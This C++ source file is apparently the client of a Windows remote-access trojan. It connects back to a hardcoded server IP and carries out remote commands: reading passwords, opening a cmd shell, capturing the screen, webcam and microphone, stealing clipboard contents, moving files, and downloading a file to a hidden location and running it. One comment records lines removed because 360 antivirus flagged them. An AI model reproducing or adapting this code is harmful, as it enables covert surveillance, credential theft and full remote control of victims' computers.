#include "StdAfx.h"
#include "WorkThreadMain.h"
#include "Resource.h"
#include <afxinet.h>

using namespace std;

static bool m_bStop = false;  //是否关闭视屏

CWorkThreadMain::CWorkThreadMain(void)
{
}

CWorkThreadMain::~CWorkThreadMain(void)
{
}

void CWorkThreadMain::GetSysInfo()
{
	m_moduleSocket.m_nPort = 9527;
	this->m_nTime = 10;
	strcpy_s(this->m_szIpAddr, "218.197.48.28");  //服务器的IP地址
}

SOCKET CWorkThreadMain::Run()
{
	SOCKET socket = INVALID_SOCKET;
	while (true)
	{
		bool bSuccess = true;
		UINT32 result = m_moduleSocket.ConnectServer((char*)m_szIpAddr, &socket, &bSuccess);
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				break;
			}
		}
		else
		{
			Sleep(this->m_nTime * 1000);
			cout << "Sleep" << endl;
		}
	}
	return socket;   //返回socket
}

void CWorkThreadMain::ShakeHandCheck(IN const SOCKET Sock, OUT bool* pbSuccess)
{
	MSGINFO_S msg;
	m_socket = Sock;
	while (true)
	{
		if (this->m_bRunFlag == false)
		{
			break;
		}
		memset(&msg, 0, sizeof(MSGINFO_S));
		bool bSuccess = true;
		UINT32 result = m_moduleSocket.RecvCommand(m_socket,(char*)&msg,sizeof(MSGINFO_S), &bSuccess);
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				const char *pSignal = "BlackYe";
				if (CMD_SHAKEHAND == msg.Msg_id && (0 == strcmp(pSignal, (char*)msg.context)))
				{
					memset(&msg, 0 , sizeof(MSGINFO_S));
					msg.Msg_id = CMD_SYSINFO;  //发送系统信息
					printf("Control_CMD: GetSystemInfo\n");
					m_sysInfo.SendSysInfo(Sock, &bSuccess);
					break;
				}
			}
		}
	}
}

void CWorkThreadMain::ExecCommand(IN const SOCKET l_Socket)
{
	bool bSuccess = true;
	MSGINFO_S msg;

	while (true)
	{
		if (this->m_bRunFlag == false)
		{
			break;
		}
		memset(&msg, 0, sizeof(MSGINFO_S));
		bool bSuccess = true;
		UINT32 result = m_moduleSocket.RecvCommand(m_socket,(char*)&msg,sizeof(MSGINFO_S), &bSuccess);
		if (ERROR_SUCCESS == result)
		{
			if (bSuccess)
			{
				switch (msg.Msg_id)
				{
				case CMD_DISKINFO:   //获取磁盘信息
					{
						printf("Control_CMD: GET Disk Info\n");
						m_diskInfo.SendDiskInfo(l_Socket);  //发送磁盘信息
					}
					break;
				case CMD_FILELIST:   //文件列表
					{
						printf("Control_CMD: GET File List Info\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)&msg.context, sizeof(szPath));
						m_diskInfo.SendFileList(szPath, l_Socket);
					}
					break;
				case CMD_DOWNLOAD:  //文件下载
					{
						printf("Control_CMD: DownLoad File Info\n");
						TEMPSTRUCT tagTemp;
						memset(&tagTemp, 0, sizeof(TEMPSTRUCT));
						memcpy((char*)tagTemp.context, (char*)msg.context, sizeof(tagTemp.context));
						tagTemp.l_Socket = l_Socket;
						tagTemp.cFileInfo = (DWORD)&m_fileInfo;
						::CloseHandle(CreateThread(NULL, 0, ToDownFileProc, (LPVOID)&tagTemp, 0, NULL));
					}
					break;
				case CMD_UPLOAD:  //文件上传(创建空文件)
					{
						printf("Control_CMD: UpLoad File !\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)msg.context, sizeof(szPath));
						m_fileInfo.CreateUpLoadFile(szPath);
					}
					break;
				case CMD_FILEUPLOAD:  //文件数据库上传
					{
						printf("Control_CMD: File Data UpLoad !\n");
						DOWNFILEDATA_S tagDownFileDate;
						memset(&tagDownFileDate, 0, sizeof(DOWNFILEDATA_S));
						memcpy((char*)&tagDownFileDate, (char*)msg.context, sizeof(DOWNFILEDATA_S));
						m_fileInfo.WriteDataInFile(tagDownFileDate);
					}
					break;
				case CMD_FILEEXEC:   //文件被执行的命令
					{
						printf("Control_CMD: File Execute !\n");
						wchar_t szFilePath[MAX_PATH] = {0};
						memcpy(szFilePath, (char*)msg.context, sizeof(szFilePath));
						m_fileInfo.ExecuteFile(szFilePath, l_Socket);
					}
					break;
				case CMD_REFRESH:   //刷新操作(同文件列表)
					{
						printf("Control_CMD: Refresh !\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)msg.context, sizeof(szPath));
						m_diskInfo.SendFileList(szPath, l_Socket);
					}
					break;
				case CMD_FOLDER_CREATE:  //创建目录
					{
						printf("Control_CMD: Create Directory !\n");
						wchar_t szPath[MAX_PATH];
						memcpy(szPath, (char*)msg.context, sizeof(szPath));
						m_diskInfo.ExecCreateFolder(szPath, l_Socket);
					}
					break;
				case CMD_FILE_DEL:   //文件(夹)删除
					{
						printf("Control_CMD: File(Folder) Delete !\n");
						FILEDELSTRUCT_S tagFileDel;
						memset(&tagFileDel, 0, sizeof(FILEDELSTRUCT_S));
						memcpy((char*)&tagFileDel.tagFileInfo, (char*)msg.context, sizeof(tagFileDel.tagFileInfo));
						tagFileDel.l_Socket = l_Socket;
						tagFileDel.cDiskInfo = (DWORD)&m_diskInfo;
						::CloseHandle(CreateThread(NULL, 0, DeleteTargetFileProc, (LPVOID)&tagFileDel, 0, NULL));
					}
					break;
				case CMD_FILE_COPY:  //文件拷贝
					{
						printf("Control_CMD: File Copy !\n");
						FILECOPY_S tagFileInfo;
						memset(&tagFileInfo, 0, sizeof(FILECOPY_S));
						memcpy((char*)&tagFileInfo, (char*)msg.context, sizeof(FILECOPY_S));
						m_diskInfo.AddCopyFileIntoList(tagFileInfo);
					}
					break;
				case CMD_FILE_PASTE:  //文件粘贴
					{
						printf("Control_CMD: File Paste !\n");
						wchar_t szFilePath[MAX_PATH] = {0};
						memcpy((char*)szFilePath, (char*)msg.context, sizeof(szFilePath));
						m_diskInfo.ExecuteCopyFile(szFilePath, l_Socket);
					}
					break;
				case CMD_FILE_RENAME:  //重命名
					{
						printf("Control_CMD: File Rename !\n");
						FILECOPY_S tagFileInfo;
						memset(&tagFileInfo, 0, sizeof(FILECOPY_S));
						memcpy((char*)&tagFileInfo, (char*)msg.context, sizeof(FILECOPY_S));
						m_diskInfo.FileReName(tagFileInfo, l_Socket);
					}
					break;
				case CMD_ATTRIBUTE:  //属性
					{
						printf("Control_CMD: Attribute !\n");
						ATTRIBUTE_S tagAttribute;
						memset(&tagAttribute, 0, sizeof(ATTRIBUTE_S));
						memcpy((char*)&tagAttribute, (char*)msg.context, sizeof(ATTRIBUTE_S));
						m_fileInfo.SendAttriInfo(tagAttribute, l_Socket);
					}
					break;
				case CMD_TELNET:  //远程CMDShell连接请求
					{
						printf("Control_CMD: CMD connect !\n");
						m_cmdShell.SetCmdSocket(l_Socket);
						::CloseHandle(CreateThread(NULL, 0, SenCmdProc, (LPVOID)&m_cmdShell, 0, NULL));
						Sleep(200);
						::CloseHandle(CreateThread(NULL, 0, InitCmdProc, (LPVOID)&m_cmdShell, 0, NULL));
					}
					break;
				case CMD_COMMOND:  //接受CMD执行命令
					{
						printf("Control_CMD: Recv CMDShell Commond !\n");
						COMMOND_S tagCmdInfo;
						char szRecvBuf[1024] = {0};
						memset(&tagCmdInfo, 0, sizeof(COMMOND_S));
						memcpy((char*)&tagCmdInfo, (char*)msg.context, sizeof(COMMOND_S));
						strcpy_s(szRecvBuf, sizeof(szRecvBuf), tagCmdInfo.command);
						m_cmdShell.Cmd_Recv(szRecvBuf);
					}
					break;
				case CMD_CHATMSG:   //接受信使消息
					{
						printf("Control_CMD: Recv Chat Msg!\n");
						CHATMSG_S tagChatMsg;
						memset(&tagChatMsg, 0, sizeof(CHATMSG_S));
						memcpy((char*)&tagChatMsg, (char*)msg.context, sizeof(CHATMSG_S));
						if (tagChatMsg.bfirstSend)  //如果是第一次发送信息，则创建一个进程开启窗口
						{
							m_ChatMsgDlg.SetSendSocket(l_Socket);
							CreateThread(NULL, 0, InitChatMsgDlgProc, (LPVOID)&m_ChatMsgDlg, 0, NULL); //弹出对话框 
							Sleep(200);
						}
						if (NULL != m_ChatMsgDlg.GetSafeHwnd())
						{
							m_ChatMsgDlg.RecvChatMsg(tagChatMsg);
						}
					}
					break;
				case CMD_PROGRESS:  //查看所有进程信息
					{
						printf("Control_CMD: View Progress Information!\n");
						m_TaskManager.SendProgressList(l_Socket, 0);
					}
					break;
				case CMD_PROC_TASKKILL:   //关闭进程
					{
						printf("Control_CMD: Taskkill Progress!\n");
						PROGRESS_S tagProInfo;
						memset(&tagProInfo, 0, sizeof(PROGRESS_S));
						memcpy((char*)&tagProInfo, (char*)msg.context, sizeof(PROGRESS_S));
						m_TaskManager.TaskkillProc(tagProInfo, l_Socket);
					}
					break;
				case CMD_GETPWD:  //获取帐号密码
					{
						printf("Control_CMD: ReadPsw!\n");
						m_readPsw.SendSecurityPwd(l_Socket);
					}
					break;
				case CMD_SCREEN:  //屏幕传输
					{
						printf("Control_CMD: Recv Screen!\n");
						m_Screen.m_socket = l_Socket;  //Socket值
						CStringA strMsg = "";
						strMsg.Format("%s", msg.context);
						if ("open" == strMsg)  //开启
						{
							m_Screen.m_bFlag = true;
							 m_Screen.m_hThread = CreateThread(NULL, 0, SendScreeProc, (LPVOID)&m_Screen, 0, NULL);
						}
						else
						{
							m_Screen.m_bFlag = false;
							::CloseHandle(m_Screen.m_hThread);
						}
					}
					break;
				case CMD_VIDEO_VIEW:  //摄像头
					{
						printf("Control_CMD: View Video !\n");
						CStringA strMsg = "";
						strMsg.Format("%s", msg.context);
						if ("open" == strMsg)  //开启
						{
							VIDEOTEMP_S tagVideoTemp;
							memset(&tagVideoTemp, 0, sizeof(VIDEOTEMP_S));
							tagVideoTemp.l_Socket = l_Socket;
							tagVideoTemp.cThis = (DWORD)this;
							m_bStop = false;
							m_hThread = CreateThread(NULL, 0, SendVideoProc, (LPVOID)&tagVideoTemp, 0, NULL);
						}
						else
						{
							m_bStop = true;
 							::CloseHandle(m_hThread);  //关闭线程句柄
						}
					}
					break;
				case CMD_OPERATOR:   //关机/注销/重启
					{
						OPERATOR_S tagOperator;
						memset(&tagOperator, 0, sizeof(OPERATOR_S));
						memcpy((char*)&tagOperator, (char*)msg.context, sizeof(OPERATOR_S));
						switch (tagOperator.nType)
						{
						case 0:  //关机
							ExecShutdown();
							break;
						case 1:  //注销
							ExecLogoff();
							break;
						case 2:  //重启
							ExecRestart();
							break;
						default: //未知
							break;
						}
					}
					break;
				case CMD_AUDIO:  //语音监听
					{
						CStringA strMsg = "";
						strMsg.Format("%s", msg.context);
						if ("open" == strMsg)  //开启
						{
							m_AudioManager.m_socket = l_Socket;
							if (m_AudioManager.Initialize())
							{
								m_AudioManager.SendRecordBuffer();
							}
						}
					}
					break;
				case CMD_BROADCAST:  //远程命令广播
					{
						BROADCAST_S tagBroadCast;
						memset(&tagBroadCast, 0, sizeof(BROADCAST_S));
						memcpy((char*)&tagBroadCast, (char*)msg.context, sizeof(BROADCAST_S));
						if (tagBroadCast.bTag)
						{
							BROADTEMP_S tagBroadTemp;
							memset(&tagBroadTemp, 0, sizeof(BROADTEMP_S));
							tagBroadTemp.cWorkMain = (DWORD)this;
							tagBroadTemp.pTagBroadCast = &tagBroadCast;
							::CloseHandle(CreateThread(NULL, 0, DealBroadCastProc, (LPVOID)&tagBroadTemp, 0, NULL));
						}
						else   //如果接受的是窗口信息
						{
							::MessageBox(NULL, tagBroadCast.tagWndInfo.szContent, tagBroadCast.tagWndInfo.szTitle, tagBroadCast.tagWndInfo.nType);
	                    }
					}
					break;
				case CMD_DESKTOP:   //桌面管理
					{
						DESKTOPINFO_S tagDesktopInfo;
						memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_S));
						memcpy((char*)&tagDesktopInfo, (char*)msg.context, sizeof(DESKTOPINFO_S));
						if (CLIPBOARD == tagDesktopInfo.nType)  //如果接受到的是发送剪贴板的数据
						{
							::CloseHandle(CreateThread(NULL, 0, SendClipBoardProc, (LPVOID)this, 0, NULL));
						}
						else
						{
							DealDesktopInfo(tagDesktopInfo);
						}
					}
					break;
				default:
					{
						printf("Control_CMD: UnKnow Command\n");
						break;
					}
				}
			}
		}
		else
		{
			break;
		}
	}
}

DWORD WINAPI CWorkThreadMain::ToDownFileProc( LPVOID lpParamter )
{
	TEMPSTRUCT* pTagTemp = (TEMPSTRUCT*)lpParamter;
	if (NULL != pTagTemp)
	{
		wchar_t szDownLoadPath[MAX_PATH] = {0};
		memcpy(szDownLoadPath, (char*)pTagTemp->context, sizeof(szDownLoadPath));
		CFileInfo* pFileInfo = (CFileInfo*)pTagTemp->cFileInfo;
		pFileInfo->SendDownFileInfo(szDownLoadPath, pTagTemp->l_Socket);
	}
	return 0;
}

//删除文件（夹）
DWORD WINAPI CWorkThreadMain::DeleteTargetFileProc( LPVOID lpParamter )
{
	FILEDELSTRUCT_S* pTagFileDel = (FILEDELSTRUCT_S*)lpParamter;
	if (NULL != pTagFileDel)
	{
		FILEINFO_S tagFileInfo;
		memset(&tagFileInfo, 0, sizeof(FILEINFO_S));
		memcpy(&tagFileInfo, (FILEINFO_S*)&pTagFileDel->tagFileInfo, sizeof(FILEINFO_S));
		CDisk* pDisk = (CDisk*)pTagFileDel->cDiskInfo;
		pDisk->DeleteTargetFile(tagFileInfo, pTagFileDel->l_Socket);  //删除文件夹
	}
	return 0;
}

//发送CMD执行结果
DWORD WINAPI CWorkThreadMain::SenCmdProc(LPVOID lpParameter)
{
	CCmdShell* pCmdShell = (CCmdShell*)lpParameter;
	pCmdShell->Cmd_Send();
	return 0;
}

DWORD WINAPI CWorkThreadMain::InitCmdProc(LPVOID lpParameter)
{
	CCmdShell* pCmdShell = (CCmdShell*)lpParameter;
	pCmdShell->Cmd_Init();
	return 0;
}

//信息服务
DWORD WINAPI CWorkThreadMain::InitChatMsgDlgProc(LPVOID lpParameter)
{
	CChatMsgDlg* pChatMsg = (CChatMsgDlg*)lpParameter;
	pChatMsg->DoModal();
	return 0;
}

//发送屏幕信息
DWORD WINAPI CWorkThreadMain::SendScreeProc(LPVOID lpParameter)
{
	CScreen* m_pScreen = (CScreen*)lpParameter;
	if (NULL != m_pScreen)
	{
		m_pScreen->SendScreenData();
	}
	return 0;
}

DWORD WINAPI CWorkThreadMain::SendVideoProc(LPVOID lpParameter)
{
	VIDEOTEMP_S* tagVideoTemp = (VIDEOTEMP_S*)lpParameter;

	CViewVideo cViewVideo;  //摄像头类
	cViewVideo.m_socket = tagVideoTemp->l_Socket;
	CWorkThreadMain* pthis = (CWorkThreadMain*)lpParameter;
	bool bInit = cViewVideo.VideoInit();
	if (!bInit)
	{
		return 1;
	}
	bool bStop = false;
	while (!bStop)  //循环发送视屏数据
	{
		cViewVideo.SendViedoHeaderInfo();  //发送位图头数据
		cViewVideo.SendVideoData();        //发送数据
// 		cViewVideo.m_dwLastSend = GetTickCount();   //这三句话被360查杀
// 		if ((GetTickCount() - cViewVideo.m_dwLastSend) < 100)
// 		{
// 			Sleep(30);
// 		}
		GetLocalTime(&cViewVideo.m_dwLastSend);
		SYSTEMTIME sysCurTime;
        GetLocalTime(&sysCurTime);
		if (sysCurTime.wMilliseconds - cViewVideo.m_dwLastSend.wMilliseconds < 100)
		{
			Sleep(30);
		}
		delete[] cViewVideo.m_pDataCompress;
		cViewVideo.m_pDataCompress = NULL;
		bStop = m_bStop;
	}
	return 0;
}

void CWorkThreadMain::ExecShutdown()  //关机
{
	ExecOperarotr(EWX_SHUTDOWN);
}

void CWorkThreadMain::ExecLogoff()  //注销
{
	ExecOperarotr(EWX_LOGOFF);
}

void CWorkThreadMain::ExecRestart()  //重启
{
	ExecOperarotr(EWX_REBOOT);
}

void CWorkThreadMain::ExecOperarotr(IN const UINT nCommond)
{
	//打开进程令牌
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), 
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("OpenProcessToken Error.\n");
	}

	//获得LUID
	TOKEN_PRIVILEGES tkp; 
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid); 
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 

	//调整令牌权限
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 
	if (GetLastError() != ERROR_SUCCESS) 
	{
		printf("AdjustTokenPrivileges Error.\n"); 
	}

	//关闭系统
	if (!ExitWindowsEx(nCommond, 0)) 
	{
		printf("Shutdown Error!\n");
	}	
}

//处理远程命令广播
DWORD WINAPI CWorkThreadMain::DealBroadCastProc(LPVOID lpParameter)
{
	BROADTEMP_S *pTagBroadTemp = (BROADTEMP_S*)lpParameter;
	BROADCAST_S* pBroadCast = (BROADCAST_S*)pTagBroadTemp->pTagBroadCast;
	CWorkThreadMain* pThis = (CWorkThreadMain*)pTagBroadTemp->cWorkMain;
	CString strRetMsg = _T("");  //执行结果

	if (pBroadCast->bTag)  //接受的是Internet的消息
	{
		HINSTANCE hExecFileRet;  //文件下载执行结果
		HINSTANCE hExecWebRet;  //网页打开执行结果
		if (pBroadCast->tagInternet.bDownLoad)  //是下载文件的
		{
			bool bSuccess = true;
			CString strExePath = _T("");  //文件下载的路径
			strRetMsg = pThis->DownloadFile(pBroadCast->tagInternet.szWebSite, strExePath, &bSuccess);  //文件下载
			if (bSuccess)  //下载成功
			{
				if (pBroadCast->tagInternet.bRunExe)  //可以运行
				{
					hExecFileRet = ShellExecute(NULL, _T("open"), strExePath, NULL, NULL, SW_SHOW);
					if ((DWORD)hExecFileRet > 32) //执行成功
					{
						strRetMsg += _T(" 文件执行成功!");
					}
					else
					{
						strRetMsg += _T(" 文件执行失败!");
					}
				}
			}
		}
		else  //只是打开网页
		{
			hExecWebRet = ShellExecute(NULL, _T("open"), pBroadCast->tagInternet.szWebSite, NULL, NULL,SW_SHOW);
			if ((DWORD)hExecWebRet > 32)
			{
				strRetMsg += _T("网页打开成功!");
			}
			else
			{
				strRetMsg += _T("网页打开失败!");
			}
		}
		wchar_t szRetMsg[512] = {0};
		MSGINFO_S tagMsgInfo;
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
		tagMsgInfo.Msg_id = CMD_BROADCAST;
		wsprintfW(szRetMsg, _T("%s"), strRetMsg);
		memcpy((char*)tagMsgInfo.context, (char*)szRetMsg, sizeof(szRetMsg));
		bool bSuccess = true;
		pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
	return 0;
}

CString CWorkThreadMain::DownloadFile(IN const CString strWebPath, OUT CString& strExePath, OUT bool* pbSuccess)
{
	bool bSuccess = true;
	strExePath.Empty();  //文件的路径
	CInternetSession netSession(NULL, 0);
	netSession.SetOption( INTERNET_OPTION_CONNECT_TIMEOUT, 5000);  //设置超时时间
	netSession.SetOption( INTERNET_OPTION_CONNECT_RETRIES, 5);  //设置重试次数
	CStdioFile *fTargFile = NULL;
	char filebuf[512];
	memset(filebuf, 0, sizeof(filebuf));
	CString strErrorMsg = _T("");
	try
	{
		fTargFile = netSession.OpenURL(strWebPath, 1, INTERNET_FLAG_TRANSFER_BINARY |INTERNET_FLAG_RELOAD);
		int filesize = fTargFile->SeekToEnd();  //文件大小
		fTargFile->SeekToBegin();  //将文件指针移动开头
		bool bExist = true;
        GetProgramPath(strExePath, &bExist);
		if (bExist)
		{
			strExePath += _T("\\");
			strExePath += fTargFile->GetFileName();
		}
		else
		{
			strErrorMsg = _T("文件目录创建在C盘下!");
			strExePath = _T("C:\\") + fTargFile->GetFileName();  //如果没有找到Program路径，则拷贝到C目录下
		}
		//创建一个隐藏的文件
		HANDLE hFile = CreateFile(strExePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			bSuccess = false;
			strErrorMsg += _T(" 创建下载文件时句柄获取失败!");
		}
		else
		{
			CFile fDestFile(hFile);
			int byteswrite;		// 写入文件的字节数
			int curTotalSize = 0;  //当前写入的字节数
			while (byteswrite = fTargFile->Read(filebuf, 512))	// 读取文件
			{
				fDestFile.Write(filebuf, byteswrite);	// 将实际数据写入文件
				curTotalSize += byteswrite;
				memset(filebuf, 0, sizeof(filebuf));
			}
			if (curTotalSize < filesize)
			{
				strErrorMsg += _T(" 服务器下载错误,请稍后再试!");
			}
			// 下载完成，关闭文件
			fTargFile->Close();
			fDestFile.Close();
			netSession.Close();  //关闭Session会话
			CloseHandle(hFile);
		}
	}
	catch (CInternetException *IE)
	{
		CString strerror;
		TCHAR error[255];

		IE->GetErrorMessage(error, 255); // 获取错误消息
		strerror = error;
		IE->Delete();					// 删除异常对象，以防止泄漏
		bSuccess = false;
		strErrorMsg += _T(" Http文件下载错误!");
	}
	if (NULL != fTargFile)
	{
		delete fTargFile;
		fTargFile = NULL;
	}
	if (bSuccess)
	{
		strErrorMsg += _T(" 文件下载成功!");
	}
	*pbSuccess = bSuccess;
	return strErrorMsg;
}

//获取windows programPath路径
UINT32 CWorkThreadMain::GetProgramPath( OUT CString& strPath, OUT bool* bSuccess)
{
#ifndef REG_LENGTH
#define REG_LENGTH  512
//注册表路径
#define REG_SUBKEY  _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion")
//文件名称
#define REG_VALUE_NAME   _T("ProgramFilesDir")
#endif

	UINT32 result = ERROR_SUCCESS;
	if (NULL == bSuccess)
	{
		result = ERROR_INVALID_PARAMETER;
		return result;
	}
	bool bRegOpen = true;    //注册表是否成功打开
	HKEY hKey;
	TCHAR SubKey[REG_LENGTH] = REG_SUBKEY;
	TCHAR path[MAX_PATH];
	DWORD len=MAX_PATH;
	DWORD attr=REG_SZ;      //属性
	LONG lRet;
	try
	{
		if (ERROR_SUCCESS == (result = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, SubKey, NULL, KEY_QUERY_VALUE, &hKey)))//打开串口注册表对应的键值
		{
			lRet = ::RegQueryValueEx(hKey, REG_VALUE_NAME, NULL, &attr, (LPBYTE)path, &len);
			if (result != lRet)  //如果返回的结果不是ERROR_SUCCESS,查找结果失败
			{
				result = lRet;
				bRegOpen = false;
				throw result;
			}
			else
			{
				strPath.Format(_T("%s"), path);
			}
		}
		else  //注册表打开失败
		{
			bRegOpen = false;
			throw result;	
		}
	}
	catch (UINT32)
	{
	}
	*bSuccess = bRegOpen;
	return result;
}

void CWorkThreadMain::DealDesktopInfo(IN const DESKTOPINFO_S tagDesktopInfo)
{
	switch (tagDesktopInfo.nType)  //管理类型
	{
	case MOUSE_MOVE:   //鼠标
		{
			if (tagDesktopInfo.bTag)  //允许鼠标移动
			{
				//释放限定
				ClipCursor(NULL);
			}
			else   //禁止鼠标移动
			{
				RECT rect; 
				rect.bottom=1; 
				rect.right=1; 
				rect.left=0; 
				rect.top=0;
				ClipCursor(&rect);
			}
		}
		break;
	case DESKTOP_ICON:  //桌面图标
		{
			if (tagDesktopInfo.bTag)  //隐藏桌面
			{
				HWND hDeskIcon=FindWindow(_T("Progman"),NULL);
				ShowWindow(hDeskIcon,SW_HIDE);
			}
			else   //显示桌面
			{
				HWND hDeskIcon=FindWindow(_T("Progman"),NULL);
				ShowWindow(hDeskIcon,SW_SHOW);
			}
		}
		break;
	case TASKBAR:  //任务栏
		{
			if (tagDesktopInfo.bTag)  //隐藏任务栏
			{
				HWND hTaskBar=FindWindow(_T("Shell_TrayWnd"),NULL);
				ShowWindow(hTaskBar,SW_HIDE);

			}
			else   //显示任务栏
			{
				HWND hTaskBar=FindWindow(_T("Shell_TrayWnd"),NULL);
				ShowWindow(hTaskBar,SW_SHOW);
			}
		}
		break;
	default:   //未知
		break;
	}
}

DWORD WINAPI CWorkThreadMain::SendClipBoardProc(LPVOID lpParameter)
{
	CWorkThreadMain* pThis = (CWorkThreadMain*)lpParameter;
	if (NULL != pThis)
	{
		char* pBuffer = NULL;   //字符串数据
		HANDLE hData = NULL;
		//打开剪贴板
		if (::OpenClipboard(NULL))
		{
			hData = ::GetClipboardData(CF_TEXT);
			pBuffer = (char*)::GlobalLock(hData);
			GlobalUnlock(hData);
			CloseClipboard();
	
			const int nBufSize = CLIPBOARD_BUF_SIZE; //缓冲区大小
			int	dwBytes = strlen(pBuffer);  //字节大小
			UINT nSendBytes = 0;
			if (NULL == pBuffer)
			{
				return 1;
			}
			char* pPacket = new char[dwBytes + 1];   //注意这里为什么要 + 1 , 还是字符串的结束标记的原因。 没有+1则会造成乱码问题
			memcpy(pPacket, pBuffer, dwBytes + 1);

			MSGINFO_S tagMsgInfo;
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			tagMsgInfo.Msg_id = CMD_DESKTOP;
			CLIPBOARD_S tagClipBoard;
			memset(&tagClipBoard, 0, sizeof(CLIPBOARD_S));
			tagClipBoard.Begin = 0;
			tagClipBoard.bRead = false;
			tagClipBoard.dwSize = dwBytes;  //数据大小
			tagClipBoard.id = 0;
			memcpy((char*)tagMsgInfo.context, (char*)&tagClipBoard, sizeof(CLIPBOARD_S));  //发送数据块的大小
			bool bSuccess = true;
			pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);

			//发送数据
			int nCount = dwBytes / nBufSize + 1;  //发送的次数
			if (0 == dwBytes % nBufSize)
			{
				nCount = nCount - 1;
			}   
			memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
			memset(&tagClipBoard, 0, sizeof(CLIPBOARD_S));
			tagClipBoard.bRead = false;
			tagClipBoard.id = 1;  //正常发送
			UINT nBegin = 0;
			for (int index = 0; index < nCount ; index++)  //循环发送
			{
				memset(&tagClipBoard.Data, 0, nBufSize); //初始化数据
				memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
				tagMsgInfo.Msg_id = CMD_DESKTOP;

				nBegin = index * nBufSize;  //每次开始发送数据的位置
				tagClipBoard.Begin = nBegin;
				tagClipBoard.dwSize  = 0;

				if (index == nCount -1)  //最后一次发送
				{
					tagClipBoard.bRead = true;  //这时可以播放语音了
					tagClipBoard.dwSize = dwBytes;  //数据的总大小
					tagClipBoard.id = 2;
					for (UINT i = nBegin, k = 0; i < dwBytes; i++, k++)
					{
						tagClipBoard.Data[k] = pPacket[i];
					}
				}
				else   //正常的一块一块发送数据
				{
					for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
					{
						tagClipBoard.Data[k] = pPacket[i];
					}
				}
				memcpy((char*)tagMsgInfo.context, (char*)&tagClipBoard, sizeof(CLIPBOARD_S));
				pThis->m_moduleSocket.SendCommand(pThis->m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
			}
			if (NULL != pPacket)
			{
				delete[] pPacket;
				pPacket = NULL;
			}
		}
	}
	return 0;
}